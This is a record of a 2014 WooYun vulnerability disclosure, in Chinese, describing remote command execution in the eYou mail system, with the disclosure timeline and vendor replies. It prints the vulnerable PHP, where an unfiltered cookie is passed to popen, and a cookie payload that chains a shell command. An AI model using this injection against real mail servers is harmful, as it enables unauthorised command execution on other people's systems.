{"id": 57178, "wybug_id": "wooyun-2014-055122", "wybug_title": "eYou邮件系统远程命令执行", "wybug_corp": "北京亿中邮信息技术有限公司", "wybug_author": "secmap", "wybug_date": "2014-03-31 16:33", "wybug_open_date": "2014-06-29 16:33", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向公众公开  简要描述： eYou邮件系统存在远程命令执行 详细说明：  #1 漏洞代码/grad/admin/domain_logo.php\n<?php/**修改：王磊  *修改时间：2007-04-09  *修改内容：判断域LOGO的路径  *  */$domain = $_COOKIE['cookie'];//接收cookie值，无任何过滤$fp = popen(\"/var/eyou/sbin/hashid \".$domain,'r');//直接带进了危险函数popen 执行任意命令$res = fread($fp,1024);header('Content-type:image/rgb');$path = \"/var/eyou/Domain/\".substr($res,-5,2).$domain.\"/LOGO/domain_logo\";$fp = file($path);foreach($fp as $key => $val){        print($val);}exit;?>\n$domain = $_COOKIE['cookie'];//接收cookie值，无任何过滤$fp = popen(\"/var/eyou/sbin/hashid \".$domain,'r');//直接带进了危险函数popen 可远程执行任意命令#2 漏洞利用访问http://secmap.cn/grad/admin/domain_logo.php   修改cookie 值为：aa|| echo test>>test.txt 刷新 便可以在该目录下生成test.txt   漏洞证明：  # 成功例子在互联网上成功测试，如图\n\n   修复方案：  你懂的   版权声明：转载请注明来源 secmap@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-04-04 23:04 厂商回复： 根据比对，该漏洞非首报，此前已经协调亿中邮公司处置。不再进入处置流程。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-31 16:39 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个已经是老漏洞。CNVD库以及WOOYUN均已经收录。暂不作为新漏洞确认。    \n     2014-04-25 09:09 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  看起来很牛，但是居然是老货鸟……    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}